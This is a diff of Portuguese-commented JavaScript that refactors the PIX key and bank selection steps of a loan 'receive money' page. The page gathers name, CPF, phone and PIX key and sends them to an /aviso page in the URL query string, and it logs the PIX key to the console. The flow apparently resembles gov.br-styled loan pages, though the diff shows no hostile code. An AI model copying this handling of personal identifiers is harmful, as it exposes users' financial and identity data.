@@ -950,6 +950,9 @@
                     // Focar no campo de chave PIX
                     document.getElementById('pixKeyInput').focus();
                     
+                    // Inicializar botões de banco após exibir a seção PIX
+                    initializeBankButtons();
+                    
                     console.log('Telefone verificado com sucesso');
                 }, 800);
             });
@@ -976,110 +979,232 @@
                 
                 // Focar no campo de chave PIX
                 document.getElementById('pixKeyInput').focus();
+                
+                // Inicializar botões de banco após exibir a seção PIX
+                initializeBankButtons();
             });
             
             // PIX type buttons
             const pixTypeButtons = document.querySelectorAll('.pix-type-button');
             const pixKeyInput = document.getElementById('pixKeyInput');
             
+            // Definir tipo CPF como padrão se nenhum tipo estiver salvo no localStorage
+            if (!localStorage.getItem('pixKeyType')) {
+                localStorage.setItem('pixKeyType', 'cpf');
+                localStorage.setItem('pixKeyTypeText', 'CPF');
+            }
+            
+            // Função para selecionar visualmente um botão de tipo PIX
+            function selectPixTypeButton(type) {
+                // Reset all buttons
+                pixTypeButtons.forEach(btn => {
+                    btn.style.backgroundColor = '#e9ecef';
+                    btn.style.color = '#333';
+                });
+                
+                // Highlight selected button
+                const targetButton = Array.from(pixTypeButtons).find(btn => btn.getAttribute('data-type') === type);
+                if (targetButton) {
+                    targetButton.style.backgroundColor = '#1351b4';
+                    targetButton.style.color = 'white';
+                }
+                
+                // Update placeholder e valor do input
+                updatePixInputForType(type);
+            }
+            
+            // Função para atualizar o campo de input para o tipo de chave
+            function updatePixInputForType(type) {
+                // Também salvar o texto para exibição
+                let pixKeyTypeText;
+                switch(type) {
+                    case 'cpf':
+                        pixKeyTypeText = 'CPF';
+                        pixKeyInput.placeholder = 'Digite seu CPF (somente números)';
+                        pixKeyInput.value = userData.cpf || '';
+                        break;
+                    case 'phone':
+                        pixKeyTypeText = 'Telefone';
+                        pixKeyInput.placeholder = 'Digite seu telefone com DDD';
+                        pixKeyInput.value = phoneInput.value || '';
+                        break;
+                    case 'email':
+                        pixKeyTypeText = 'Email';
+                        pixKeyInput.placeholder = 'Digite seu e-mail';
+                        pixKeyInput.value = '';
+                        break;
+                    case 'random':
+                        pixKeyTypeText = 'Chave Aleatória';
+                        pixKeyInput.placeholder = 'Digite sua chave aleatória';
+                        pixKeyInput.value = '';
+                        break;
+                    default:
+                        pixKeyTypeText = 'CPF';
+                        pixKeyInput.placeholder = 'Digite seu CPF (somente números)';
+                        pixKeyInput.value = userData.cpf || '';
+                }
+                localStorage.setItem('pixKeyTypeText', pixKeyTypeText);
+            }
+            
+            // Selecionar visualmente o botão correspondente ao tipo salvo no localStorage
+            selectPixTypeButton(localStorage.getItem('pixKeyType') || 'cpf');
+            
+            // Adicionar eventos aos botões
             pixTypeButtons.forEach(button => {
                 button.addEventListener('click', function() {
-                    // Reset all buttons
-                    pixTypeButtons.forEach(btn => {
-                        btn.style.backgroundColor = '#e9ecef';
-                        btn.style.color = '#333';
-                    });
-                    
-                    // Highlight selected button
-                    this.style.backgroundColor = '#1351b4';
-                    this.style.color = 'white';
-                    
-                    // Update input placeholder based on selected type
+                    // Obter o tipo do botão clicado
                     const type = this.getAttribute('data-type');
                     
-                    // Save PIX key type to localStorage
+                    // Salvar no localStorage
                     localStorage.setItem('pixKeyType', type);
                     
-                    // Também salvar o texto para exibição
-                    let pixKeyTypeText;
-                    switch(type) {
-                        case 'cpf':
-                            pixKeyTypeText = 'CPF';
-                            break;
-                        case 'phone':
-                            pixKeyTypeText = 'Telefone';
-                            break;
-                        case 'email':
-                            pixKeyTypeText = 'Email';
-                            break;
-                        case 'random':
-                            pixKeyTypeText = 'Chave Aleatória';
-                            break;
-                        default:
-                            pixKeyTypeText = 'CPF';
-                    }
-                    localStorage.setItem('pixKeyTypeText', pixKeyTypeText);
-                    console.log(`Tipo de chave PIX alterado: ${type} (${pixKeyTypeText})`);
+                    // Selecionar visualmente o botão
+                    selectPixTypeButton(type);
                     
-                    switch(type) {
-                        case 'cpf':
-                            pixKeyInput.placeholder = 'Digite seu CPF (somente números)';
-                            pixKeyInput.value = userData.cpf || '';
-                            break;
-                        case 'phone':
-                            pixKeyInput.placeholder = 'Digite seu telefone com DDD';
-                            pixKeyInput.value = phoneInput.value || '';
-                            break;
-                        case 'email':
-                            pixKeyInput.placeholder = 'Digite seu e-mail';
-                            pixKeyInput.value = '';
-                            break;
-                        case 'random':
-                            pixKeyInput.placeholder = 'Digite sua chave aleatória';
-                            pixKeyInput.value = '';
-                            break;
-                    }
+                    console.log(`Tipo de chave PIX alterado: ${type} (${localStorage.getItem('pixKeyTypeText')})`);
                     
-                    // Focus on input
+                    // Foco no campo de input
                     pixKeyInput.focus();
                 });
             });
             
-            // Bank selection buttons
-            const bankButtons = document.querySelectorAll('.bank-button');
-            const receiveMoneyButton = document.getElementById('receiveMoneyButton');
+            // Variáveis para os elementos
+            let receiveMoneyButton;
+            let bankButtons;
             
-            bankButtons.forEach(button => {
-                button.addEventListener('click', function() {
-                    // Reset all buttons
-                    bankButtons.forEach(btn => {
-                        btn.style.backgroundColor = '#e9ecef';
-                        btn.style.color = '#333';
-                    });
+            // Função para inicializar botões do banco - será chamada quando a seção estiver visível
+            function initializeBankButtons() {
+                console.log("Inicializando botões do banco");
+                // Obtém referências aos elementos
+                receiveMoneyButton = document.getElementById('receiveMoneyButton');
+                bankButtons = document.querySelectorAll('.bank-button');
+                
+                // Restaura estado salvo do banco selecionado, se existir
+                const savedBank = localStorage.getItem('selectedBank');
+                if (savedBank && bankButtons.length > 0) {
+                    // Encontrar o botão correspondente ao banco salvo
+                    const savedBankButton = Array.from(bankButtons).find(btn => 
+                        btn.getAttribute('data-bank') === savedBank);
                     
-                    // Highlight selected button
-                    this.style.backgroundColor = '#1351b4';
-                    this.style.color = 'white';
-                    
-                    // Enable receive money button
-                    if (pixKeyInput.value.trim()) {
-                        receiveMoneyButton.disabled = false;
-                        receiveMoneyButton.style.opacity = '1';
-                        receiveMoneyButton.style.cursor = 'pointer';
+                    if (savedBankButton) {
+                        // Restaurar visualmente o botão como selecionado
+                        bankButtons.forEach(btn => {
+                            btn.style.backgroundColor = '#e9ecef';
+                            btn.style.color = '#333';
+                        });
+                        
+                        savedBankButton.style.backgroundColor = '#1351b4';
+                        savedBankButton.style.color = 'white';
+                        
+                        console.log("Banco restaurado do localStorage:", savedBank);
                     }
-                    
-                    // Store selected bank
-                    const bank = this.getAttribute('data-bank');
-                    localStorage.setItem('selectedBank', bank);
-                });
-            });
+                }
+                
+                if (bankButtons.length > 0) {
+                    bankButtons.forEach(button => {
+                        button.addEventListener('click', function() {
+                            console.log("Botão do banco clicado:", this.getAttribute('data-bank'));
+                            
+                            // Reset all buttons
+                            bankButtons.forEach(btn => {
+                                btn.style.backgroundColor = '#e9ecef';
+                                btn.style.color = '#333';
+                            });
+                            
+                            // Highlight selected button
+                            this.style.backgroundColor = '#1351b4';
+                            this.style.color = 'white';
+                            
+                            // Store selected bank
+                            const bank = this.getAttribute('data-bank');
+                            localStorage.setItem('selectedBank', bank);
+                            
+                            // Verifica se podemos habilitar o botão de receber dinheiro
+                            updateReceiveButtonState();
+                        });
+                    });
+                }
+                
+                // Configura o evento de clique do botão de receber dinheiro
+                if (receiveMoneyButton) {
+                    receiveMoneyButton.addEventListener('click', function() {
+                        // Disable button and show loading state
+                        this.disabled = true;
+                        this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processando...';
+                        
+                        // Get all user data needed for next page
+                        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+                        const loanData = JSON.parse(localStorage.getItem('loanData') || '{}');
+                        const pixKey = pixKeyInput.value.trim();
+                        const selectedBank = document.querySelector('.bank-button[style*="background-color: rgb(19, 81, 180)"]')?.getAttribute('data-bank') || '';
+                        
+                        // Certifica-se que pegamos o tipo de chave mais recente
+                        const pixKeyType = localStorage.getItem('pixKeyType') || 'cpf';
+                        
+                        // Map the type to a human-readable format
+                        let pixKeyTypeText;
+                        switch(pixKeyType) {
+                            case 'cpf':
+                                pixKeyTypeText = 'CPF';
+                                break;
+                            case 'phone':
+                                pixKeyTypeText = 'Telefone';
+                                break;
+                            case 'email':
+                                pixKeyTypeText = 'Email';
+                                break;
+                            case 'random':
+                                pixKeyTypeText = 'Chave Aleatória';
+                                break;
+                            default:
+                                pixKeyTypeText = 'CPF';
+                        }
+                        
+                        // Log para depuração
+                        console.log("Tipo de chave PIX selecionado:", pixKeyType, `(${pixKeyTypeText})`, "PIX key:", pixKey);
+                        
+                        // Armazenar todos os dados PIX em uma estrutura unificada
+                        const pixData = {
+                            pixKey: pixKey,
+                            pixKeyType: pixKeyType,
+                            pixKeyTypeText: pixKeyTypeText,
+                            selectedBank: selectedBank
+                        };
+                        
+                        // Salvar a estrutura completa no localStorage
+                        localStorage.setItem('pixData', JSON.stringify(pixData));
+                        
+                        // Manter os itens individuais para compatibilidade com código atual
+                        localStorage.setItem('pixKey', pixKey);
+                        localStorage.setItem('pixKeyTypeText', pixKeyTypeText);
+                        
+                        // Prepare parameters for aviso page
+                        const params = new URLSearchParams({
+                            nome: userData.nome || '',
+                            cpf: userData.cpf || '',
+                            phone: userData.phone || '',
+                            pix_key: pixKey,
+                            bank: selectedBank,
+                            amount: loanData.amount || '0',
+                            term: loanData.term || '0'
+                        });
+                        
+                        // Redirect to the aviso page with parameters
+                        setTimeout(() => {
+                            window.location.href = '/aviso?' + params.toString();
+                        }, 1500);
+                    });
+                }
+            }
             
-            // PIX key input validation
-            pixKeyInput.addEventListener('input', function() {
-                const value = this.value.trim();
+            // Função para atualizar o estado do botão de receber dinheiro
+            function updateReceiveButtonState() {
+                if (!receiveMoneyButton) return;
+                
+                const pixKeyValue = document.getElementById('pixKeyInput')?.value.trim();
                 const selectedBank = localStorage.getItem('selectedBank');
                 
-                if (value && selectedBank) {
+                if (pixKeyValue && selectedBank) {
                     receiveMoneyButton.disabled = false;
                     receiveMoneyButton.style.opacity = '1';
                     receiveMoneyButton.style.cursor = 'pointer';
@@ -1088,76 +1213,14 @@
                     receiveMoneyButton.style.opacity = '0.5';
                     receiveMoneyButton.style.cursor = 'not-allowed';
                 }
-            });
+            }
             
-            // Receive money button
-            receiveMoneyButton.addEventListener('click', function() {
-                // Disable button and show loading state
-                this.disabled = true;
-                this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processando...';
-                
-                // Get all user data needed for next page
-                const userData = JSON.parse(localStorage.getItem('userData') || '{}');
-                const loanData = JSON.parse(localStorage.getItem('loanData') || '{}');
-                const pixKey = pixKeyInput.value.trim();
-                const selectedBank = document.querySelector('.bank-button[style*="background-color: rgb(19, 81, 180)"]')?.getAttribute('data-bank') || '';
-                
-                // Certifica-se que pegamos o tipo de chave mais recente
-                const pixKeyType = localStorage.getItem('pixKeyType') || 'cpf';
-                
-                // Map the type to a human-readable format
-                let pixKeyTypeText;
-                switch(pixKeyType) {
-                    case 'cpf':
-                        pixKeyTypeText = 'CPF';
-                        break;
-                    case 'phone':
-                        pixKeyTypeText = 'Telefone';
-                        break;
-                    case 'email':
-                        pixKeyTypeText = 'Email';
-                        break;
-                    case 'random':
-                        pixKeyTypeText = 'Chave Aleatória';
-                        break;
-                    default:
-                        pixKeyTypeText = 'CPF';
-                }
-                
-                // Log para depuração
-                console.log("Tipo de chave PIX selecionado:", pixKeyType, `(${pixKeyTypeText})`, "PIX key:", pixKey);
-                
-                // Armazenar todos os dados PIX em uma estrutura unificada
-                const pixData = {
-                    pixKey: pixKey,
-                    pixKeyType: pixKeyType,
-                    pixKeyTypeText: pixKeyTypeText,
-                    selectedBank: selectedBank
-                };
-                
-                // Salvar a estrutura completa no localStorage
-                localStorage.setItem('pixData', JSON.stringify(pixData));
-                
-                // Manter os itens individuais para compatibilidade com código atual
-                localStorage.setItem('pixKey', pixKey);
-                localStorage.setItem('pixKeyTypeText', pixKeyTypeText);
-                
-                // Prepare parameters for aviso page
-                const params = new URLSearchParams({
-                    nome: userData.nome || '',
-                    cpf: userData.cpf || '',
-                    phone: userData.phone || '',
-                    pix_key: pixKey,
-                    bank: selectedBank,
-                    amount: loanData.amount || '0',
-                    term: loanData.term || '0'
+            // PIX key input validation
+            if (pixKeyInput) {
+                pixKeyInput.addEventListener('input', function() {
+                    updateReceiveButtonState();
                 });
-                
-                // Redirect to the aviso page with parameters
-                setTimeout(() => {
-                    window.location.href = '/aviso?' + params.toString();
-                }, 1500);
-            });
+            }
 
             // Video handling (if present)
             const video = document.getElementById('newsVideo');
@@ -1194,6 +1257,15 @@
                         soundButton.style.display = 'none';
                     }
                 });
+            }
+            
+            // Verificar se a seção de PIX está visível na carga inicial (para usuários que atualizarem a página)
+            if (document.getElementById('pixKeySection') && 
+                document.getElementById('pixKeySection').style.display !== 'none') {
+                // Inicializar botões do banco se a seção estiver visível
+                setTimeout(() => {
+                    initializeBankButtons();
+                }, 300);
             }
         });
 
